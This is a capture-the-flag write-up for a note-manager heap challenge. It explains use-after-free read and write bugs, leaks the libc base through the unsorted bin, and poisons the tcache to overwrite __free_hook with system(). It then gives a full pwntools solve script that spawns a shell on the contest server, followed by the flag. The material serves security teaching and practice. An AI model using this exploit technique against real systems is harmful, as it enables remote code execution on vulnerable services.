Binary Exploitation
Binary Exploitation
Binary Exploitation
Binary Exploitation
Binary Exploitation
Binary Exploitation
## Vulnerability Analysis

The binary contains two critical **Use-After-Free (UAF)** vulnerabilities:

1. **UAF Read:** The `Show Note` function does not check if a note index has been freed before printing its content.
    
2. **UAF Write:** The `Edit Note` function does not check if a note index has been freed before allowing the user to modify its content.
    

These vulnerabilities allow us to read heap metadata (leaking addresses) and corrupt heap metadata (manipulating the allocator).

## Exploitation Strategy

### 1. Leaking Libc Base (Unsorted Bin Leak)

To bypass ASLR, we need to leak a libc address.

- **Method:** We allocate a chunk larger than the Tcache limit (e.g., `0x420` bytes). When freed, this chunk goes into the **Unsorted Bin** instead of the Tcache.
    
- **Leak:** In the Unsorted Bin, the `fd` and `bk` pointers of the freed chunk point back to the `main_arena` within libc. By using the **UAF Read**, we print the content of this freed chunk to leak the address of `main_arena + 96`.
    
- **Calculation:** `Libc Base = Leak - 96 - offset_of_main_arena`.
    

### 2. Tcache Poisoning (Arbitrary Write)

With the libc base known, we target the **Tcache** to get an arbitrary write primitive.

- **Method:** We allocate and free a small chunk (e.g., `0x60` bytes) so it lands in the Tcache.
    
- **Corruption:** Using the **UAF Write**, we overwrite the `fd` pointer of this freed chunk to point to `__free_hook`.
    
- **Poisoning:** The next time we request a chunk of that size, the allocator returns the original chunk. The _subsequent_ request returns our target address (`__free_hook`).
    

### 3. Getting a Shell

- **Overwrite:** We write the address of `system()` into `__free_hook`.
    
- **Trigger:** We verify that a chunk containing the string `/bin/sh` exists (or create one). We then call `delete()` on that chunk.
    
- **Execution:** `free(ptr_to_bin_sh)` is replaced by `system("/bin/sh")`, giving us a shell.
    

## Final Solve Script

Python

```
from pwn import *

# Configuration
exe = './chall'
libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'

context.binary = elf = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)

# Connect to Remote
p = remote('ctf.nexus-security.club', 2808)

def add(index, size, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index (0-9): ', str(index).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Content: ', content)

def delete(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(index).encode())

def show(index):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(index).encode())

def edit(index, content):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(index).encode())
    p.sendlineafter(b'New Content: ', content)

log.info("--- Step 1: Leaking Libc Base ---")
# Allocate chunk > 0x410 for Unsorted Bin
add(0, 0x420, b'A'*8)
add(1, 0x20, b'Guard') # Guard chunk

delete(0) # Free to Unsorted Bin

show(0)   # UAF Read
p.recvuntil(b'Data: ')
leak_raw = p.recvline(keepends=False)
leak_val = u64(leak_raw.ljust(8, b'\x00')[:8])
log.success(f"Leaked Raw Address: {hex(leak_val)}")

# Calculate Libc Base (Unsorted bin fd -> main_arena + 96)
libc.address = leak_val - 96 - 0x10 - libc.symbols['__malloc_hook']
log.success(f"Libc Base: {hex(libc.address)}")

log.info("--- Step 2: Tcache Poisoning ---")
add(2, 0x60, b'Chunk 2')
add(3, 0x60, b'Chunk 3')

delete(3)
delete(2)

# UAF Write: Point fd to __free_hook
edit(2, p64(libc.symbols['__free_hook']))

# Allocations to reach target
add(4, 0x60, b'/bin/sh\x00')       # Chunk 2 recycled
add(5, 0x60, p64(libc.symbols['system'])) # Returns __free_hook, write system

log.info("--- Step 3: Trigger Shell ---")
delete(4) # system("/bin/sh")

p.interactive()
```

## Flag

`nexus{h3ap_u4f_t0_tcache_p0is0ning_is_fun}`

